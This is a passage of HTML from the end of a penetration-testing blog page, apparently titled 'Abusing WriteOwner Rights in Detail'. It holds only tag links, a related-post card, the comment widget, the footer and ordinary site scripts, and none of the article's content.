class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/ad/">ad</a> <a class="post-tag" href="/tags/courses/">courses</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/escapetwo/">escapetwo</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/oscp/">oscp</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/OSCP-first-journey/"><div class="card-body"> <span class="timeago small" >Aug 25, 2021<i class="unloaded">2021-08-25T18:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>My first failed journey in the OSCP</h3><div class="text-muted small"><p> Hi! Welcome to my first post in this blog. I hope you don’t get brutally bored reading my horribly written posts, but I’ll improve. So, let’s inaugurate this blog with a very typical write which i...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/OSCP-first-journey/" class="btn btn-outline-primary" prompt="Older"><p>My first failed journey in the OSCP</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//xexio15-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Abusing WriteOwner Rights in Detail'; this.page.url = 'https://xexio15.github.io/posts/WriteOwner/'; this.page.identifier = '/posts/WriteOwner/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/username">0x10</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/cybersecurity/">cybersecurity</a> <a class="post-tag" href="/tags/learning/">learning</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/ad/">ad</a> <a class="post-tag" href="/tags/courses/">courses</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/escapetwo/">escapetwo</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/oscp/">oscp</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://xexio15.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-Y8Z9R603NW"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-Y8Z9R603NW'); }); </script>
